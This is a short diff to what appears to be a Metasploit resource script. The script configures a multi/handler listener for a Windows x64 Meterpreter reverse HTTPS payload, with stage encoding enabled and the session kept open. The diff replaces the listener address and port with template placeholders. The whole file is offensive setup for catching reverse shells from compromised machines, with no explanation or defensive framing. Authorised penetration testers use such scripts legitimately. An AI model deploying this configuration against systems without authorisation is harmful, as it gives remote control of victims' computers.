@@ -1,7 +1,7 @@
 use exploit/multi/handler
-set payload windows/meterpreter/reverse_https
-set LHOST YOUR_IP_HERE
-set LPORT 443  
+set payload windows/x64/meterpreter/reverse_https
+set LHOST !!!IP_MARK!!!
+set LPORT !!!PORT_MARK!!!  
 set exitonsession false
 set enablestageencoding true
 set exitfunc thread
